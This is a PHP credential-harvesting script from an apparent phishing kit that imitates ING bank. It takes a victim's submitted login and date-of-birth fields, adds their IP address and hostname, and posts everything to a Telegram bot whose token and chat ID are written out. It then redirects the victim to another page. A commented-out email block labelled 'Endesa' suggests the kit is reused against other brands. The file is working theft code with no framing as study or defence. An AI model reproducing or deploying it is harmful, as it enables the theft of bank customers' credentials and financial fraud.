  ﻿<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "=======|| ING ||========\n";
$message .= "login		: ".$_POST['documentnumber']."\n";
$message .= "pass1 dd	: ".$_POST['DD']."\n";
$message .= "pass2 mm		: ".$_POST['MM']."\n";
$message .= "pass3 aaaa		: ".$_POST['AAAA']."\n";
$message .= "==============================\n";
$message .= "IP Address 		: ".$ip."\n";
$message .= "Host Name 		: ".$hostname."\n";
$message .= "==========|| ING ||==========\n";

//$send = "";
//$subject = "Endesa[CC] | ".$ip."\n";
//$headers = "From: pc.endesa<>";
//mail($send,$subject,$message,$headers);
$website="https://api.telegram.org/bot1314679037:AAFCpgIfxZfsNhyx1cHrmrfIp-NFDjhOFKY";
$chatId=-558966247;  //Receiver Chat Id 
$params=[
    'chat_id'=>'-558966247',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

echo '<meta http-equiv="refresh" content="0; URL=../../informatica.php">';

?>  